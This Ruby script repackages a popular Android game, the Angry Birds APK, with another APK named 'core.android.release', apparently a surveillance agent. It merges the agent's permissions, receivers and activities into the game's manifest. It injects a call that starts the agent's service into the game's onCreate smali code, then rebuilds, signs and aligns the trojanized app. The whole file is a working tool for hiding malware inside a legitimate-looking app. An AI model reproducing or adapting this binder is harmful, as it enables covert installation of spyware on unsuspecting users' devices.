
require 'FileUtils'
require 'xmlsimple'
require 'pp'

BASE="C:/HT/Reversing/Android/dex2jar-0.0.9.9"

def unpack(filename)
	print "unpack #{filename}\n"
	
	basename=File.basename(filename, '.*')
	FileUtils.rm_f basename
	print "delete #{basename}\n"
	
	prog = "java.exe -jar #{BASE}/apktool.jar d -f #{filename}"
	print prog
	system(prog)
	return File.basename(filename, '.*')
end

def parseManifest(rcsdir, pkgdir)
	print "parse manifest #{pkgdir}\n"
	
	xmlrcs = XmlSimple.xml_in("#{rcsdir}/AndroidManifest.xml")
	xmlpkg = XmlSimple.xml_in("#{pkgdir}/AndroidManifest.xml")

	activities=xmlpkg["application"][0]["activity"]
	
	name=""
	activities.each do |act| 
		begin
			main = act["intent-filter"][0]["action"][0]["android:name"]
			if(main == "android.intent.action.MAIN") then
				print "NAME = #{act["android:name"]}\n" 
				name=act["android:name"]
				break
			end	
		rescue			
		end
	end
		
	xmlpkg["uses-permission"] += xmlrcs["uses-permission"]
	xmlpkg["application"][0]["receiver"] += xmlrcs["application"][0]["receiver"]
	xmlpkg["application"][0]["activity"] += xmlrcs["application"][0]["activity"]
	
	manifest = XmlSimple.xml_out(xmlpkg);

	return name, manifest
end

def patchManifest(rcsdir, manifest)
	print "patch Manifest\n"
	file= File.new("#{rcsdir}/AndroidManifest.xml", "w")
	#file= File.new("AndroidManifest.xml", "w")
	manifest["opt"]="manifest"
	manifest.insert(0,"<?xml version=\"1.0\" encoding=\"utf-8\"?>\n")
	file.write(manifest)
	file.close
end

def patchMain(rcsdir, mainpack)
	print "patch main #{mainpack}\n"
	#arr = mainpack.split('.')[0..-2].join('/')	
	#file = mainpack.split('.').pop
	filename = mainpack.split('.').join('/')	
	print "filename = #{filename}\n"
	
	filepath = "#{rcsdir}/smali/#{filename}.smali"
	contentFile = File.new(filepath, "r")
	content=contentFile.read
	contentFile.close
	
	oncreate=".method public onCreate(Landroid/os/Bundle;)V"
	pos = content.index(oncreate);
	print "pos = #{pos}\n"
	
	methodFile=File.new("methodStartService.txt", "r")
	method = methodFile.read
	methodFile.close
	
	invoke = "    invoke-direct {p0}, L$APPNAME$;->startService()V\n"
	invoke["$APPNAME$"]=filename
	
	content.insert(pos + oncreate.size() +1 , invoke )
		
	method["$APPNAME$"]=filename
	
	content.insert(pos, method)
		
	contentFile = File.new(filepath, "w")
	contentFile.write(content)
	contentFile.close
	
end

def merge(rcsdir, pkgdir)
	print "merging dirs \n"
	FileUtils.cp_r "#{pkgdir}/.", "#{rcsdir}"	
end

def pack(dirname)
	print "pack #{dirname}\n"
	tempfile="#{dirname}.temp.apk"
	outfile="#{dirname}.outfile.apk"

	buildcmd = "java.exe -jar #{BASE}/apktool.jar b #{dirname} #{tempfile}"
	signcmd = "jarsigner.exe -keystore #{BASE}/certs/zeno-release-key.keystore -storepass password -keypass password #{tempfile} ReleaseZ"
	aligncmd = "zipalign.exe -f 4 #{tempfile} #{outfile}"
	
	system(buildcmd)
	system(signcmd)
	system(aligncmd)
	
	FileUtils.rm_r(tempfile)
end

def main()
	rcsdir=unpack("core.android.release.apk")
	pkgdir=unpack("com.rovio.angrybirds.apk")
	
	mainpack, newmanifest = parseManifest(rcsdir, pkgdir)
	
	merge(rcsdir,pkgdir)
	
	patchMain(rcsdir, mainpack)	
	patchManifest(rcsdir, newmanifest)
	
	print "moving #{rcsdir} in #{pkgdir}\n"
	FileUtils.mv(pkgdir, "old")
	FileUtils.mv(rcsdir, "./#{pkgdir}")
	FileUtils.rm_r("old")

	pack(pkgdir)
end

def test()
	rcsdir="core.android.release"
	pkgdir="com.rovio.angrybirds"
	#FileUtils.mv(rcsdir, "./#{pkgdir}")
	mainpack, newmanifest = parseManifest(rcsdir, pkgdir)
	patchManifest(rcsdir, newmanifest)
end

main